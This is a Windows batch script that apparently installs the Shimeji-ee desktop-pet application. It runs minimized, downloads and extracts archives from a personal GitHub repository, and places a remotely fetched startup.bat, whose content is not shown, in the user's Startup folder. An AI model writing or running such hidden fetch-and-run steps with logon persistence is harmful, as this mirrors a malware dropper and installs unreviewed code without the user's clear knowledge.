@echo off

:: Run this script minimized
if not "%1" == "minimized" (
    start /min cmd /c "%~f0" minimized
    exit
)

:: Navigate to the root of C:
cd C:/

:: Create a directory named 's'
mkdir s

:: Download the zip file using PowerShell's Invoke-WebRequest
PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/obi3333/Oba/archive/refs/heads/main.zip' -OutFile 'C:/s/m.zip'"

:: Extract the downloaded zip file
PowerShell -Command "Expand-Archive -Path 'C:/s/m.zip' -DestinationPath 'C:/s'"

:: Extract the second zip file from the first archive
PowerShell -Command "Expand-Archive -Path 'C:/s/Oba-main/shimeege.zip' -DestinationPath 'C:/s/shimeege'"

:: Download the startup script from GitHub and add it to the Windows startup folder
set STARTUP_FOLDER=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/obi3333/Oba/raw/main/startup.bat' -OutFile '%STARTUP_FOLDER%\startup.bat'"

:: Navigate to the directory containing the Java application
cd C:/s/shimeege/shimeege

:: Run the Java application in the background (optional for immediate execution)
start /min javaw -jar Shimeji-ee.jar
